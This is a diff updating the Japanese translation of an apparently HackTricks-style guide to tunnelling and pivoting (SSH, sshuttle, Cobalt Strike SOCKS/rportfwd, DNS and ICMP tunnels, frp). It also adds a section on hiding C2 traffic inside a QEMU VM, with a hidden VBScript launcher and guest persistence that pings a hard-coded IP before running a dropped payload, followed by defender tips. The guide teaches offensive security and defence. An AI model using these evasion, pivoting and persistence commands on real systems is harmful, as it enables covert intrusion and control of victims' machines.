@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-両方のデバイスで**rootが必要**です（新しいインターフェースを作成するため）およびsshdの設定でrootログインを許可する必要があります：\
+両方のデバイスで**rootが必要**です（新しいインターフェースを作成するため）し、sshdの設定はrootログインを許可する必要があります：\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -89,11 +89,11 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **セキュリティ – テラピン攻撃 (CVE-2023-48795)**
-> 2023年のテラピンダウングレード攻撃により、マンインザミドルが初期SSHハンドシェイクを改ざんし、**任意の転送チャネル**（ `-L`, `-R`, `-D` ）にデータを注入することができます。クライアントとサーバーの両方がパッチ適用されていることを確認してください（**OpenSSH ≥ 9.6/LibreSSH 6.7**）またはSSHトンネルに依存する前に、脆弱な `chacha20-poly1305@openssh.com` および `*-etm@openssh.com` アルゴリズムを `sshd_config`/`ssh_config` で明示的に無効にしてください。
+> 2023年のテラピンダウングレード攻撃により、マンインザミドルが初期SSHハンドシェイクを改ざんし、**任意の転送チャネル**（ `-L`, `-R`, `-D` ）にデータを注入することができます。クライアントとサーバーの両方がパッチ適用されていることを確認してください（**OpenSSH ≥ 9.6/LibreSSH 6.7**）または、SSHトンネルに依存する前に、脆弱な `chacha20-poly1305@openssh.com` および `*-etm@openssh.com` アルゴリズムを `sshd_config`/`ssh_config` で明示的に無効にしてください。
 
 ## SSHUTTLE
 
-**ssh** を介してホストを通じて **サブネットワーク** への **トラフィック** をすべて **トンネル** できます。\
+**ssh** を介してホストを通じて **サブネットワーク** への **トラフィック** を **トンネル** できます。\
 例えば、10.10.10.0/24 へのすべてのトラフィックを転送すること。
 ```bash
 pip install sshuttle
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKSプロキシ
 
-チームサーバーでポートを開き、**ビコーンを通じてトラフィックをルーティングする**ために使用できるすべてのインターフェースでリッスンします。
+すべてのインターフェースでリッスンしているteamserverでポートを開き、**ビークンを通じてトラフィックをルーティングする**ことができます。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -149,7 +149,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> この場合、**ポートはビーコーンホストで開かれます**。チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送られます。
+> この場合、**ポートはビーコンホストで開かれます**。チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送信されます。
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -160,7 +160,7 @@ rportfwd stop [bind port]
 - トラフィックは**BeaconのC2トラフィック内でトンネリングされます**、P2Pリンクを含みます。
 - **管理者権限は必要ありません** 高ポートでリバースポートフォワードを作成するために。
 
-### rPort2Portローカル
+### rPort2Port ローカル
 
 > [!WARNING]
 > この場合、**ポートはbeaconホストで開かれます**、Team Serverではなく、**トラフィックはCobalt Strikeクライアントに送信されます**（Team Serverではなく）、そこから指定されたホスト:ポートに送信されます。
@@ -401,7 +401,7 @@ Tunnel 2222:<attackers_machine>:443
 
 ## YARP
 
-Microsoftによって作成されたリバースプロキシです。ここで見つけることができます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Microsoftによって作成されたリバースプロキシです。こちらで見つけることができます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNSトンネリング
 
@@ -415,7 +415,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-トンネルは非常に遅くなります。このトンネルを通じて圧縮されたSSH接続を作成するには、次のコマンドを使用します:
+トンネルは非常に遅くなります。このトンネルを通じて圧縮されたSSH接続を作成するには、次のようにします:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -446,7 +446,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### プロキシチェインのDNSを変更する
 
-Proxychainsは`gethostbyname` libcコールをインターセプトし、TCP DNSリクエストをソックスプロキシを通してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
+Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNSリクエストをsocksプロキシを通してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
 
 ## Goでのトンネル
 
@@ -459,7 +459,7 @@ Proxychainsは`gethostbyname` libcコールをインターセプトし、TCP DNS
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-両方のシステムでルート権限が必要で、ICMPエコーリクエストを使用してトンアダプタを作成し、データをトンネリングします。
+両方のシステムでルート権限が必要で、tunアダプタを作成し、ICMPエコーリクエストを使用してデータをトンネリングします。
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -517,8 +517,8 @@ _必要に応じて、認証とTLSを追加することも可能です。_
 ```
 #### HTTPコールのスニッフィング
 
-_XSS、SSRF、SSTI ... に役立ちます。_\
-stdoutから直接、またはHTTPインターフェース [http://127.0.0.1:4040](http://127.0.0.1:4000) で。
+_XSS、SSRF、SSTIに役立ちます..._\
+stdoutから直接、またはHTTPインターフェースで [http://127.0.0.1:4040](http://127.0.0.1:4000) 。
 
 #### 内部HTTPサービスのトンネリング
 ```bash
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Cloudflareの`cloudflared`デーモンは、**ローカルTCP/UDPサービス**を公開するアウトバウンドトンネルを作成でき、インバウンドファイアウォールルールを必要とせず、Cloudflareのエッジを待ち合わせポイントとして使用します。これは、出口ファイアウォールがHTTPSトラフィックのみを許可し、インバウンド接続がブロックされている場合に非常に便利です。
+Cloudflareの`cloudflared`デーモンは、**ローカルTCP/UDPサービス**を公開するアウトバウンドトンネルを作成でき、インバウンドファイアウォールルールを必要とせず、Cloudflareのエッジを待ち合わせ地点として使用します。これは、出口ファイアウォールがHTTPSトラフィックのみを許可し、インバウンド接続がブロックされている場合に非常に便利です。
 
 ### Quick tunnel one-liner
 ```bash
@@ -608,11 +608,69 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-上記のコマンドは、被害者のポート **8080** を **attacker_ip:9000** として公開し、追加のツールを展開することなく実行します - ライビングオフザランドのピボットに最適です。
+上記のコマンドは、被害者のポート **8080** を **attacker_ip:9000** として公開し、追加のツールを展開することなく実行します – ライビングオフザランドのピボッティングに最適です。
+
+## QEMUを使用した隠密VMベースのトンネル
+
+QEMUのユーザーモードネットワーキング（`-netdev user`）は、*ホスト*上のTCP/UDPポートを**バインド**し、*ゲスト*に転送する`hostfwd`というオプションをサポートしています。 ゲストが完全なSSHデーモンを実行している場合、hostfwdルールは、エフェメラルVM内に完全に存在する使い捨てSSHジャンプボックスを提供します – すべての悪意のある活動とファイルが仮想ディスク内に留まるため、EDRからC2トラフィックを隠すのに最適です。
+
+### クイックワンライナー
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• 上記のコマンドは、**Tiny Core Linux** イメージ (`tc.qcow2`) を RAM に起動します。  
+• Windows ホストのポート **2222/tcp** は、ゲスト内の **22/tcp** に透過的に転送されます。  
+• 攻撃者の視点から見ると、ターゲットは単にポート 2222 を公開しており、そこに到達するパケットは VM 内で実行されている SSH サーバーによって処理されます。  
+
+### VBScript を通じてステルスに起動する
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+`cscript.exe //B update.vbs`を実行すると、ウィンドウが隠れたままになります。
+
+### ゲスト内の持続性
+
+Tiny Coreはステートレスであるため、攻撃者は通常：
+
+1. ペイロードを`/opt/123.out`にドロップします。
+2. `/opt/bootlocal.sh`に追加します：
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. ペイロードがシャットダウン時に`mydata.tgz`にパックされるように、`home/tc`と`opt`を`/opt/filetool.lst`に追加します。
+
+### なぜこれが検出を回避するのか
+
+• 署名されていない実行可能ファイル（`qemu-system-*.exe`）はディスクに触れるのは2つだけで、ドライバやサービスはインストールされていません。
+• ホスト上のセキュリティ製品は**無害なループバックトラフィック**を検出します（実際のC2はVM内で終了します）。
+• メモリスキャナは、異なるOSに存在するため、悪意のあるプロセス空間を分析しません。
+
+### Defenderのヒント
+
+• ユーザーが書き込み可能なパスにある**予期しないQEMU/VirtualBox/KVMバイナリ**に警告を出します。
+• `qemu-system*.exe`から発信されるアウトバウンド接続をブロックします。
+• QEMUの起動直後にバインドされる珍しいリスニングポート（2222、10022、…）を探します。
+
+---
 
 ## チェックすべき他のツール
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## 参考文献
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
